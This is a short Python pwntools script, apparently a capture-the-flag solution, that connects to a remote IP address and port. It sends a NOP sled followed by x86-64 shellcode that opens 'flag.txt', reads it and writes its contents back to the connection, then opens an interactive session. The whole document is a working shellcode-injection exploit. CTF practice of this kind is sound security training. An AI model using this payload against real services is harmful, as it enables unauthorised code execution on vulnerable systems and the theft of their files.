from pwn import *

context.arch = 'amd64'

# io = process('./challenge')
# gdb.attach(io, api=True)
io = remote('34.126.117.161', 3000)

payload = b'\x90'*400
payload += b"\x6A\x02\x58\x48\x31\xF6\x48\x31\xD2\x56\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x53\x48\x89\xE7\x0F\x05" # open('flag.txt')
payload += asm(shellcraft.amd64.linux.read('rax', 'rsp', 100) + shellcraft.amd64.linux.write(1, 'rsp', 100), arch='amd64')
print(payload)
io.sendline(payload)
io.interactive()